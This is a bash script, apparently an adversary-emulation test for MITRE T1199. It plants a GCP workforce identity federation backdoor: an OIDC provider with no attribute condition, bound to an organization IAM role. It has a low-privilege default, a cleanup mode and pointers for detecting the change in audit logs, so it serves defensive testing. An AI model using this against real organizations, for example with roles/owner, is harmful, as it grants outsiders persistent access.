#!/usr/bin/env bash
# T1199 Trusted Relationship — GCP Workforce Identity Federation backdoor.
#
# Creates a workforce identity pool and an external OIDC provider with NO attribute condition
# (so any identity the external IdP asserts is accepted) and binds the pool's principalSet
# directly to an organization IAM role — an external, org-scoped federated identity with no
# service-account / workloadIdentityUser step.
#
# SAFETY: binds a low-privilege role by default (roles/browser); a real intrusion would bind
# roles/owner. Run only against an organization you control. 'cleanup' removes the binding,
# the provider, and the pool (idempotent). Requires gcloud authenticated with rights to manage
# workforce pools and set IAM policy at organization scope.
#
#   emulate_gcp_workforce.sh create  ORG POOL PROVIDER ISSUER ROLE
#   emulate_gcp_workforce.sh cleanup ORG POOL PROVIDER ISSUER ROLE
set -euo pipefail

MODE="${1:?usage: emulate_gcp_workforce.sh {create|cleanup} ORG POOL PROVIDER ISSUER ROLE}"
ORG="${2:?organization id required}"
POOL="${3:-atomic-ext-pool}"
PROVIDER="${4:-atomic-ext-idp}"
ISSUER="${5:-https://issuer.example.com}"
ROLE="${6:-roles/browser}"
MEMBER="principalSet://iam.googleapis.com/locations/global/workforcePools/${POOL}/*"

command -v gcloud >/dev/null 2>&1 || { echo "gcloud CLI not found" >&2; exit 1; }

create() {
  echo "[*] creating workforce pool '$POOL' on organization $ORG"
  gcloud iam workforce-pools create "$POOL" --organization="$ORG" --location=global \
    --display-name="atomic ext pool"
  echo "[*] creating OIDC provider '$PROVIDER' with NO attribute condition (issuer $ISSUER)"
  gcloud iam workforce-pools providers create-oidc "$PROVIDER" --organization="$ORG" \
    --location=global --workforce-pool="$POOL" --issuer-uri="$ISSUER" \
    --attribute-mapping="google.subject=assertion.sub" \
    --web-sso-response-type=code \
    --web-sso-assertion-claims-behavior=merge-user-info-over-id-token-claims
  echo "[*] binding $MEMBER -> $ROLE on organization $ORG"
  gcloud organizations add-iam-policy-binding "$ORG" --role="$ROLE" --member="$MEMBER"
  echo "[*] done. Review the organization's Admin Activity log for CreateWorkforcePoolProvider"
  echo "    (empty attributeCondition) and the cloudresourcemanager SetIamPolicy principalSet binding."
}

cleanup() {
  echo "[*] removing binding / provider / pool (idempotent)"
  gcloud organizations remove-iam-policy-binding "$ORG" --role="$ROLE" --member="$MEMBER" --quiet 2>/dev/null || true
  gcloud iam workforce-pools providers delete "$PROVIDER" --organization="$ORG" --location=global \
    --workforce-pool="$POOL" --quiet 2>/dev/null || true
  gcloud iam workforce-pools delete "$POOL" --organization="$ORG" --location=global --quiet 2>/dev/null || true
}

case "$MODE" in
  create) create ;;
  cleanup) cleanup ;;
  *) echo "usage: emulate_gcp_workforce.sh {create|cleanup} ORG POOL PROVIDER ISSUER ROLE" >&2; exit 1 ;;
esac
